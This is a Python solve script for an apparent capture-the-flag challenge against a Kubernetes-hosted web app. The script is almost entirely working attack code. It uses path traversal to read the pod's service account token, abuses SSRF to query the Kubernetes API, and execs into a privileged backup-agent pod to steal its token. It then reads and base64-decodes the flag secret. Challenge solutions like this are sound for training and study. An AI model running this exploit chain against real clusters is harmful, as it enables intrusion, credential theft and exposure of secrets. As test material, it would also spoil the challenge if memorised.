#!/usr/bin/env python3
"""
kub3::br34ch — Full Solve Script (Hard)

Attack chain:
1. Discover /debug/env → learn K8s API address and pod info
2. Path traversal via /debug/logs → read service account token
3. SSRF to K8s API with token → list pods (frontend-sa can do this)
4. Find backup-agent pod (labeled privileged: true)
5. Read backup-agent pod logs → confirms it has secret access
6. Exec into backup-agent pod via SSRF → extract backup-agent-sa token
7. Use backup-agent token to list secrets
8. Read flag-secret → base64 decode → flag
"""
import sys
import json
import base64
import requests

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8082

BASE = f"http://{HOST}:{PORT}"
K8S_API = "http://127.0.0.1:6443"

print(f"[*] Target: {BASE}")
print()


def ssrf(url, token=None):
    payload = {"url": url}
    if token:
        payload["authorization"] = f"Bearer {token}"
    r = requests.post(f"{BASE}/fetch", json=payload)
    data = r.json()
    if "body" in data:
        try:
            return json.loads(data["body"])
        except (json.JSONDecodeError, TypeError):
            return data["body"]
    return data


def lfi(path):
    r = requests.get(f"{BASE}/debug/logs", params={"path": path})
    data = r.json()
    return data.get("content", data.get("error", ""))


print("[1] Enumerating pod environment...")
r = requests.get(f"{BASE}/debug/env")
env = r.json()
print(f"    Pod: {env['POD_NAME']}")
print(f"    Namespace: {env['POD_NAMESPACE']}")
print(f"    Service Account: {env['SERVICE_ACCOUNT']}")
print(f"    K8s API: {env['KUBERNETES_SERVICE_HOST']}:{env['KUBERNETES_SERVICE_PORT']}")
print()

print("[2] Extracting service account token via path traversal...")
token = lfi("../../../../var/run/secrets/kubernetes.io/serviceaccount/token")
print(f"    Token: {token[:60]}...")
namespace = lfi("../../../../var/run/secrets/kubernetes.io/serviceaccount/namespace")
print(f"    Namespace: {namespace}")
print()

print("[3] Testing K8s API access via SSRF...")
api_response = ssrf(f"{K8S_API}/api", token)
print(f"    API versions: {api_response}")
print()

print("[4] Listing pods in production namespace...")
pods = ssrf(f"{K8S_API}/api/v1/namespaces/production/pods", token)
print("    Pods found:")
for pod in pods.get("items", []):
    name = pod["metadata"]["name"]
    sa = pod["spec"]["serviceAccountName"]
    labels = pod["metadata"].get("labels", {})
    priv = labels.get("privileged", "")
    marker = " ← PRIVILEGED" if priv == "true" else ""
    print(f"      {name} (sa: {sa}){marker}")
print()

print("[5] Attempting to list secrets with frontend-sa token...")
secrets_resp = ssrf(f"{K8S_API}/api/v1/namespaces/production/secrets", token)
if isinstance(secrets_resp, dict) and secrets_resp.get("code") == 403:
    print(f"    FORBIDDEN: {secrets_resp.get('message', '')[:100]}")
    print("    Need to escalate privileges!")
else:
    print("    Unexpected: got access directly")
print()

print("[6] Reading backup-agent pod logs...")
logs = ssrf(f"{K8S_API}/api/v1/namespaces/production/pods/backup-agent-8f2c6d4a1-q9m7k/log", token)
print(f"    Logs:\n{logs[:300]}")
print()

print("[7] Pivoting: exec into backup-agent to extract its SA token...")
backup_token = ssrf(
    f"{K8S_API}/api/v1/namespaces/production/pods/backup-agent-8f2c6d4a1-q9m7k/exec?command=cat&command=/var/run/secrets/kubernetes.io/serviceaccount/token",
    token
)
print(f"    Backup SA token: {backup_token[:60]}...")
print()

print("[8] Listing secrets with backup-agent-sa token...")
secrets = ssrf(f"{K8S_API}/api/v1/namespaces/production/secrets", backup_token)
print("    Secrets found:")
for secret in secrets.get("items", []):
    print(f"      - {secret['metadata']['name']}")
print()

print("[9] Reading flag-secret...")
flag_secret = ssrf(f"{K8S_API}/api/v1/namespaces/production/secrets/flag-secret", backup_token)
flag_b64 = flag_secret.get("data", {}).get("flag", "")
flag = base64.b64decode(flag_b64).decode()
print(f"    Raw (base64): {flag_b64}")
print(f"    Decoded: {flag}")
print()
print(f"[+] FLAG CAPTURED: {flag}")
